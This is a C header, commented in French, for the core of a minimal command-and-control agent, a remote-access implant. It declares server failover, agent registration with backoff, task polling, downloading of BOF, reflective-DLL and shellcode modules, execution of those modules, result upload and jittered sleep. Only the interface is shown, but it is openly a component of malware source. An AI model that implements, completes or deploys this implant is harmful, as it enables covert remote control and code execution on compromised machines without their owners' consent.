/*
 * ============================================================
 *  core.h — Interface du cœur de l'agent C2 minimal
 *
 *  Rôle : Enregistrement, polling, téléchargement et exécution
 *         des modules dynamiques, envoi des résultats.
 *
 *  Aucun module built-in — toutes les tâches passent par le
 *  moteur d'exécution dynamique (coff_loader / rdll_loader).
 *
 *  Dépend de : platform.h, utils.h, http.h, execution_engine.h
 * ============================================================
 */
#ifndef CORE_H
#define CORE_H

#include "platform.h"
#include "utils.h"
#include "http.h"
#include "execution_engine.h"

/* ============================================================
 *  RÉPONSE DE POLLING
 *
 *  Champs reçus du serveur lors d'un GET /agent/{id}/poll.
 *  file_data est heap-alloué pour le module upload, NULL sinon.
 *  L'appelant doit libérer file_data avec free() après usage.
 * ============================================================ */
typedef struct {
    int   has_task;           /* 1 si une tâche est disponible          */
    char  task_id[32];        /* Identifiant unique de la tâche         */
    char  command[4096];      /* Commande/arguments bruts               */
    char  module[64];         /* Nom du module : "sysinfo", "shell"...  */
    char  technique[16];      /* "bof" | "rdll" | "shellcode" | "src"  */
    char  filename[256];      /* upload: nom du fichier source          */
    char *file_data;          /* upload: données base64 (heap-alloué)   */
} PollResponse;


/* ============================================================
 *  CONNEXION ET ENREGISTREMENT
 * ============================================================ */

/**
 * Tente chaque serveur de C2_SERVER_LIST jusqu'au premier succès.
 * Met à jour ctx->server_url et ctx->agent_id.
 * Retourne 1 si connecté, 0 si aucun serveur joignable.
 */
int try_connect_any_server(AgentContext *ctx, const SystemInfo *si,
                           const char *saved_id, int has_saved);

/**
 * Boucle d'enregistrement avec backoff exponentiel.
 * Retourne 1 si enregistré, 0 si ctx->running est mis à 0.
 */
int register_agent(AgentContext *ctx, const SystemInfo *si);


/* ============================================================
 *  POLLING ET ENVOI
 * ============================================================ */

/**
 * Interroge le serveur pour une tâche pending.
 * Retourne :
 *   1  → tâche reçue
 *   0  → pas de tâche ou erreur transitoire
 *  -1  → agent inconnu (404) → réenregistrement requis
 */
int poll_server(AgentContext *ctx, PollResponse *pr);

/**
 * Envoie le résultat d'une tâche au serveur C2.
 * Retourne 1 si HTTP 200, 0 sinon.
 */
int send_result(AgentContext *ctx, const char *task_id,
                const char *output, const char *status);


/* ============================================================
 *  BOUCLE PRINCIPALE
 *
 *  Pour chaque tâche reçue :
 *    1. Détermine la technique (bof/rdll, défaut bof)
 *    2. Télécharge le module depuis /api/modules/<nom>?technique=...
 *    3. Pack les args en format BeaconData
 *    4. Appelle execute_module()
 *    5. Envoie le résultat
 *    6. Attend l'intervalle jitteré
 * ============================================================ */
void poll_loop(AgentContext *ctx, const SystemInfo *si);


#endif /* CORE_H */
